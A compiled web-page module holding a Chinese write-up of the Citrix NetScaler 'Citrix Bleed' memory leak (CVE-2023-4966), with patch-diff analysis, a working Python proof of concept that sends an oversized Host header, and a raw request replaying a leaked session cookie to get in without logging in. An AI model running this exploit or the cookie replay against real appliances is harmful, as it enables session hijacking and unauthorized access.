import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as u,a as n,b as t,d as e,e as p}from"./app-58e4a7d6.js";const r={},l=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),c=n("p",null,"NetScaler ADC和NetScaler Gateway是美国思杰（Citrix）公司的产品。Citrix Gateway是一套安全的远程接入解决方案，可提供应用级和数据级管控功能，以实现用户从任何地点远程访问应用和数据；Citrix ADC是一个全面的应用程序交付和负载均衡解决方案，用于实现应用程序安全性、整体可见性和可用性。",-1),d=n("p",null,[t("在 Citrix 设备设置为网关（VPN 虚拟服务器、ICA 代理、CVPN、RDP 代理）或 AAA 虚拟服务器的情况下，可以通过访问"),n("code",null,"/oauth/idp/.well-known/openid-configuration"),t("路由并往 HOST字段发送大量数据从而泄露缓冲区信息，其中可能包含session cookie相关信息，攻击者可以借助该信息无需经过身份验证实现访问。")],-1),q=n("p",null,"参考链接：",-1),v={href:"https://xz.aliyun.com/t/13031",target:"_blank",rel:"noopener noreferrer"},_=p(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>NetScaler ADC 和 NetScaler Gateway 14.1 &lt; 14.1-8.50
NetScaler ADC 和 NetScaler Gateway 13.1 &lt; 13.1-49.15
NetScaler ADC 和 NetScaler Gateway 13.0 &lt; 13.0-92.19
NetScaler ADC 13.1-FIPS &lt; 13.1-37.164
NetScaler ADC 12.1-FIPS &lt; 12.1-55.300
NetScaler ADC 12.1-NDcPP &lt; 12.1-55.300
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>选择 NetScaler Gateway 的 13.1-49.15和13.1-48.47 两个版本进行分析，主要关注其 /netscaler/nsppe 二进制文件的相关补丁，该文件是 NetScaler 数据包处理引擎，它包含完整的 TCP/IP 网络堆栈以及多个 HTTP 服务。</p><p>通过分析，最终确定与漏洞相关的函数为：ns_aaa_oauth_send_openid_config和ns_aaa_oauthrp_send_openid_config</p><p>更新前后代码的主要差异如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 更新前

iVar3 = snprintf(print_temp_rule,0x20000,
               &quot;{\\&quot;issuer\\&quot;: \\&quot;https://%.*s\\&quot;, \\&quot;authorization_endpoint\\&quot;: \\&quot;https://%.*s/oauth/ idp/login\\&quot;, \\&quot;token_endpoint\\&quot;: \\&quot;https://%.*s/oauth/idp/token\\&quot;, \\&quot;jwks_uri\\&quot;:  \\&quot;https://%.*s/oauth/idp/certs\\&quot;, \\&quot;response_types_supported\\&quot;: [\\&quot;code\\&quot;, \\&quot;toke n\\&quot;, \\&quot;id_token\\&quot;], \\&quot;id_token_signing_alg_values_supported\\&quot;: [\\&quot;RS256\\&quot;], \\&quot;end _session_endpoint\\&quot;: \\&quot;https://%.*s/oauth/idp/logout\\&quot;, \\&quot;frontchannel_logout_sup ported\\&quot;: true, \\&quot;scopes_supported\\&quot;: [\\&quot;openid\\&quot;, \\&quot;ctxs_cc\\&quot;], \\&quot;claims_support ed\\&quot;: [\\&quot;sub\\&quot;, \\&quot;iss\\&quot;, \\&quot;aud\\&quot;, \\&quot;exp\\&quot;, \\&quot;iat\\&quot;, \\&quot;auth_time\\&quot;, \\&quot;acr\\&quot;, \\&quot;amr \\&quot;, \\&quot;email\\&quot;, \\&quot;given_name\\&quot;, \\&quot;family_name\\&quot;, \\&quot;nickname\\&quot;], \\&quot;userinfo_endpoin t\\&quot;: \\&quot;https://%.*s/oauth/idp/userinfo\\&quot;, \\&quot;subject_types_supported\\&quot;: [\\&quot;public\\&quot;]}&quot;
               ,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8);
authv2_json_resp = 1;
iVar3 = ns_vpn_send_response(param_1,0x100040,print_temp_rule,iVar3);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 更新后

uVar7 = snprintf(print_temp_rule,0x20000,
               &quot;{\\&quot;issuer\\&quot;: \\&quot;https://%.*s\\&quot;, \\&quot;authorization_endpoint\\&quot;: \\&quot;https://%.*s/oauth/ idp/login\\&quot;, \\&quot;token_endpoint\\&quot;: \\&quot;https://%.*s/oauth/idp/token\\&quot;, \\&quot;jwks_uri\\&quot;:  \\&quot;https://%.*s/oauth/idp/certs\\&quot;, \\&quot;response_types_supported\\&quot;: [\\&quot;code\\&quot;, \\&quot;toke n\\&quot;, \\&quot;id_token\\&quot;], \\&quot;id_token_signing_alg_values_supported\\&quot;: [\\&quot;RS256\\&quot;], \\&quot;end _session_endpoint\\&quot;: \\&quot;https://%.*s/oauth/idp/logout\\&quot;, \\&quot;frontchannel_logout_sup ported\\&quot;: true, \\&quot;scopes_supported\\&quot;: [\\&quot;openid\\&quot;, \\&quot;ctxs_cc\\&quot;], \\&quot;claims_support ed\\&quot;: [\\&quot;sub\\&quot;, \\&quot;iss\\&quot;, \\&quot;aud\\&quot;, \\&quot;exp\\&quot;, \\&quot;iat\\&quot;, \\&quot;auth_time\\&quot;, \\&quot;acr\\&quot;, \\&quot;amr \\&quot;, \\&quot;email\\&quot;, \\&quot;given_name\\&quot;, \\&quot;family_name\\&quot;, \\&quot;nickname\\&quot;], \\&quot;userinfo_endpoin t\\&quot;: \\&quot;https://%.*s/oauth/idp/userinfo\\&quot;, \\&quot;subject_types_supported\\&quot;: [\\&quot;public\\&quot;]}&quot;
               ,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8);
uVar4 = 0x20;
if (uVar7 &lt; 0x20000) {
    authv2_json_resp = 1;
    iVar3 = ns_vpn_send_response(param_1,0x100040,print_temp_rule,uVar7);
    ...
}

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该代码段落在访问 <code>/oauth/idp/.well-known/openid-configuration</code> 路由的时候将被调用，其逻辑是通过调用 snprintf()函数构造一个 json 数据并通过 ns_vpn_send_response() 函数形成http response 返回给用户，这个 json 数据中拼接了来自 http 请求的 <strong>HOST 字段的数据</strong>。</p><p>snprintf()函数虽然通过第二个参数限制了 print_temp_rule对应的字符串的最大长度，但是 snprintf()函数的返回值却是 完成 format 之后预期的 字符串的长度，也就是说即使第二个参数为 0x20000 ，snprintf()函数的返回值可以大于 0x20000。</p><p>ns_vpn_send_response()函数的第四个参数决定了读取的内存大小，这就意味着 紧跟在 print_temp_rule变量之后的缓冲区中的信息能够被带入 response 当中。</p><p>从上面的分析可以想到，攻击者能够在访问 /oauth/idp/.well-known/openid-configuration路由时往 Host字段插入大量数据，从而使得返回的response 中带上缓冲区信息，导致信息泄露。</p><p>poc：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urljoin

url <span class="token operator">=</span> <span class="token string">&quot;https://ip:port&quot;</span>

headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Host&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;a&quot;</span><span class="token operator">*</span><span class="token number">24578</span><span class="token punctuation">}</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urljoin<span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token string">&quot;/oauth/idp/.well-known/openid-configuration&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;resp.txt&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在 response 中可能会包含 长度为 65 或 32 的 session cookie ，比如：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>5e588bab9a60e4831bc1da8ade46d78b0c3a01c3a45525d5f4f58455e445a4a42
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>攻击者可以借助该信息无需经过身份验证实现系统的访问：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /logon/LogonPoint/Authentication/GetUserName HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: NSC_AAAC=5e588bab9a60e4831bc1da8ade46d78b0c3a01c3a45525d5f4f58455e445a4a42
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><p>官方最新版本已修复此漏洞。下载地址为：</p>`,20),m={href:"https://www.citrix.com/downloads/citrix-adc/",target:"_blank",rel:"noopener noreferrer"};function b(k,h){const s=o("ExternalLinkIcon");return i(),u("div",null,[l,c,d,q,n("ul",null,[n("li",null,[n("a",v,[t("https://xz.aliyun.com/t/13031"),e(s)])])]),_,n("ul",null,[n("li",null,[n("a",m,[t("https://www.citrix.com/downloads/citrix-adc/"),e(s)])])])])}const f=a(r,[["render",b],["__file","Citrix NetScaler ADC _ Gateway 信息泄露漏洞 CVE-2023-4966.html.vue"]]);export{f as default};
